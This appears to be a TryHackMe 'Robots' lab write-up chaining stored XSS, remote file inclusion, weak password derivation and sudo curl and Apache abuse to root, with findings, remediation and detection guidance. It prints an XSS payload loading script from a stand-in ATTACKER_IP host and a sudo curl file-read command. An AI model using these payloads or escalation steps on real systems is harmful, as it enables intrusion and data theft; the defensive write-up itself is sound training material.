---
title: "TryHackMe: Robots"
date: 2026-06-12 23:55:00 +0200
categories: [TryHackMe]
tags:
  - linux
  - web
  - xss
  - rfi
  - php
  - ssh
  - credential-recovery
  - sudo
  - curl
  - apache
  - privilege-escalation
description: >-
  Robots chains stored XSS, an administrative URL fetcher vulnerable to remote
  file inclusion, weak password derivation, sudo curl wildcard abuse, and
  passwordless Apache execution into complete compromise.
author: lenovolegion7
media_subpath: /images/tryhackme_robots
image:
  path: room_image.webp
  alt: "Original TryHackMe Robots room artwork"
toc: true
comments: false
---

Robots is a Linux web-to-root challenge built around stored XSS, a vulnerable administrative URL-fetching feature, weak credential derivation, and unsafe sudo delegation. The validated path progressed from web enumeration to command execution as `www-data`, then recovered SSH access as `rgiskard`, moved laterally to `dolivaw`, and finally abused passwordless Apache execution for root-level file disclosure.

> Passwords, hashes, target addresses, and TryHackMe flags are redacted.
{: .prompt-warning }

[![TryHackMe Robots room card](room_card.webp){: w="298" h="273" .shadow }](https://tryhackme.com/room/robots){: .center }

## Executive Summary

The target exposed SSH and two Apache-backed HTTP services:

```text
22/tcp    SSH
80/tcp    HTTP
9000/tcp  HTTP
```

The validated compromise path was:

1. enumerate HTTP content and review `robots.txt`;
2. identify the nested application route `/harm/to/self/`;
3. discover `register.php`, `login.php`, and `admin.php`;
4. register a username containing stored JavaScript;
5. wait for the administrative bot to render the payload;
6. use the privileged admin URL-fetcher as a remote file inclusion primitive;
7. execute attacker-served PHP as `www-data`;
8. review application source and database material;
9. recover the custom password-derivation logic;
10. derive the valid SSH credential for `rgiskard`;
11. authenticate to SSH;
12. abuse a sudo rule permitting `curl` as `dolivaw`;
13. use curl's additional URL/output handling to read and write files as `dolivaw`;
14. obtain persistent shell access as `dolivaw` through an authorized SSH key;
15. abuse `dolivaw`'s passwordless sudo access to Apache;
16. use Apache configuration parsing to disclose the root-owned objective.

> **Result:** Web application flaws were converted into host-level access, lateral movement, and root file disclosure through a chain of stored XSS, remote file inclusion, weak credential design, and unsafe sudo rules.
{: .prompt-danger }

## Scope and Safety Context

This assessment was performed only against the authorized TryHackMe Robots lab.

Testing was limited to the assigned target and challenge objectives. Third-party systems, unrelated infrastructure, denial-of-service testing, and destructive persistence were excluded.

## Initial Enumeration

Representative discovery:

```console
$ nmap \
  -p22,80,9000 \
  -sV -sC -T4 -Pn \
  TARGET_IP
```

Observed services:

```text
22/tcp    SSH   OpenSSH 8.9p1
80/tcp    HTTP  Apache 2.4.61
9000/tcp  HTTP  Apache 2.4.52
```

The hostname used by the application was:

```text
robots.thm
```

## robots.txt and Application Discovery

`robots.txt` disclosed several paths:

```text
/harming/humans
/ignoring/human/orders
/harm/to/self
```

The exploitable application was located under:

```text
/harm/to/self/
```

Further enumeration identified:

```text
register.php
login.php
admin.php
```

## Stored XSS in Registration

The registration workflow rendered user-controlled usernames inside an administrative view without safe output encoding.

A controlled script payload in the username field was later executed by an administrative bot.

The public report omits the attacker's callback address but preserves the technique:

```html
<script src="http://ATTACKER_IP/x.js"></script>
```

The administrative bot fetched the controlled script, confirming privileged-context execution.

## Remote File Inclusion Through Admin URL Fetcher

The administrative page exposed a URL-fetching field:

```html
<input type="text" name="url">
```

The feature accepted attacker-controlled remote content and processed it as executable PHP.

A controlled remote PHP resource was supplied through the privileged admin context. The result was command execution as:

```text
uid=33(www-data)
```

This provided the first operating-system foothold.

## Source and Database Credential Recovery

Post-exploitation review exposed application source, database configuration, password-generation logic, and user hashes.

The application derived initial passwords from:

```text
username + formatted date of birth
```

and then stored a double-MD5 result.

The constrained date component made password recovery practical for:

```text
rgiskard
```

The recovered password is intentionally not published:

```text
rgiskard : [REDACTED]
```

## SSH Foothold as rgiskard

The derived credential authenticated successfully over SSH:

```console
$ ssh rgiskard@TARGET_IP
```

The `rgiskard` account had a sudo rule involving curl:

```text
(dolivaw) /usr/bin/curl LOOPBACK_URL/*
```

The intended URL restriction was insufficient because curl accepts additional URLs and output arguments.

## sudo curl Wildcard Abuse to dolivaw

The sudo rule allowed `rgiskard` to execute curl as `dolivaw` against a loopback URL pattern.

Curl's multi-URL and output behavior allowed arbitrary file reads as `dolivaw`. Representative concept:

```console
$ sudo -u dolivaw \
  /usr/bin/curl \
  LOOPBACK_URL/ \
  file:///home/dolivaw/user.txt
```

The user objective is published only as:

```text
THM{[REDACTED]}
```

The same argument flexibility permitted a controlled SSH public key to be written to:

```text
/home/dolivaw/.ssh/authorized_keys
```

This provided direct shell access as `dolivaw`.

## Passwordless sudo Apache Execution

Under `dolivaw`, sudo enumeration exposed:

```text
(ALL) NOPASSWD: /usr/sbin/apache2
```

Apache command-line options allowed an arbitrary root-owned file to be parsed as a configuration file.

The validated approach used Apache's `-f` configuration-file option and a controlled module-loading directive to force parsing of:

```text
/root/root.txt
```

The parser output disclosed the root objective.

The public result is redacted:

```text
THM{[REDACTED]}
```

## Findings

### F-01 - Stored Cross-Site Scripting in Registration

- **Severity:** High
- **Affected component:** `/harm/to/self/register.php`
- **Impact:** JavaScript execution in an administrative browser context

The registration form accepted untrusted markup in the username field, which was later rendered to an administrative viewer without proper output encoding.

**Remediation:**

- apply context-aware output encoding;
- validate input server-side;
- deploy a strict Content Security Policy;
- avoid rendering untrusted data in privileged administrative views.

### F-02 - Remote File Inclusion in Admin URL Fetcher

- **Severity:** Critical
- **Affected component:** `/harm/to/self/admin.php`
- **Impact:** remote command execution as `www-data`

The privileged URL-fetching feature processed attacker-controlled remote PHP as executable code.

**Remediation:**

- never include remote resources as executable code;
- disable remote PHP inclusion;
- enforce strict destination allowlists;
- separate fetch and render logic;
- sandbox administrative fetchers without code-execution capability.

### F-03 - Weak Custom Password Derivation

- **Severity:** High
- **Affected component:** registration/authentication logic
- **Impact:** SSH credential recovery

The application derived predictable passwords from username and date-of-birth data and used weak MD5-based processing.

**Remediation:**

- use normal password enrollment rather than deterministic derivation;
- store passwords with Argon2id or bcrypt;
- use unique salts and appropriate work factors;
- never derive credentials from predictable personal information.

### F-04 - Sudo Wildcard Misconfiguration with curl

- **Severity:** High
- **Affected account:** `rgiskard`
- **Target account:** `dolivaw`
- **Impact:** arbitrary file reads and writes as another user

The sudo rule attempted to constrain curl to a loopback URL but did not constrain additional URLs or output options.

**Remediation:**

- avoid wildcard-based sudo rules for multi-purpose tools;
- use root-owned wrapper scripts with fixed arguments;
- validate all parameters;
- consider command digests and `NOEXEC`;
- follow strict least privilege.

### F-05 - Passwordless sudo Apache Execution

- **Severity:** Critical
- **Affected account:** `dolivaw`
- **Sudo rule:** `(ALL) NOPASSWD: /usr/sbin/apache2`
- **Impact:** root-owned file disclosure and root compromise

Apache's command-line configuration parsing could be pointed at arbitrary files under root privilege.

**Remediation:**

- remove passwordless sudo access to Apache;
- if an operational action is required, expose only that fixed action through a root-owned wrapper;
- prohibit user-controlled `-f`, `-C`, and related configuration arguments.

## Security Impact

The validated chain resulted in complete compromise of the host's security boundary.

An attacker with equivalent access could:

- execute JavaScript in a privileged administrative context;
- turn a URL-fetcher into server-side code execution;
- recover application and database secrets;
- derive a valid SSH credential;
- obtain interactive shell access;
- read and write files as another user through sudo curl;
- establish direct access as `dolivaw`;
- read root-owned files through passwordless Apache execution.

The compromise depended on multiple trust failures across web authorization, remote content handling, credential design, and sudo configuration.

## Detection Opportunities

Useful monitoring controls include:

- alert on script tags or unusual markup in registration data;
- monitor administrative bot requests to external hosts;
- alert on admin URL-fetcher requests for PHP or executable content;
- detect Apache/PHP child processes spawning shells;
- scan application source and databases for weak or deterministic credential schemes;
- monitor sudo curl execution with multiple URLs, `file://`, `-o`, or `--create-dirs`;
- alert on changes to user `authorized_keys`;
- monitor passwordless sudo Apache execution;
- detect Apache invocations using unusual `-f` or `-C` arguments.

## Remediation Priorities

1. Remove remote PHP inclusion from `admin.php`.
2. Remove passwordless sudo Apache execution.
3. Replace the sudo curl wildcard rule with a fixed safe wrapper.
4. Patch stored XSS in registration.
5. Rotate all exposed application, database, and SSH credentials.
6. Replace deterministic MD5 password generation with proper password enrollment and modern hashing.
7. Segment the web application and database.
8. Add logging and detection for administrative URL fetching and sudo abuse.

## Retest Plan

1. Confirm stored registration input is safely encoded in administrative views.
2. Verify the admin URL fetcher cannot execute remote PHP.
3. Confirm `www-data` command execution is no longer possible through the fetcher.
4. Verify predictable date-derived credentials are no longer generated.
5. Confirm the old `rgiskard` credential no longer authenticates.
6. Verify the sudo curl rule cannot read or write arbitrary `dolivaw` files.
7. Confirm unauthorized SSH keys cannot be planted in `dolivaw`'s profile.
8. Verify `dolivaw` no longer has unrestricted passwordless Apache execution.
9. Confirm Apache cannot parse arbitrary root-owned files under delegated sudo.
10. Verify the complete previous chain no longer discloses the root objective.

## Lessons Learned

Robots demonstrates how a web application compromise can become a full host compromise when privilege boundaries are weak.

Stored XSS provided access to an administrative workflow, remote file inclusion converted that trust into operating-system execution, deterministic password logic exposed an SSH credential, and overly broad sudo rules provided successive privilege transitions.

The strongest defensive response is to treat administrative browser workflows, remote content processing, password design, and sudo argument control as one connected attack surface.
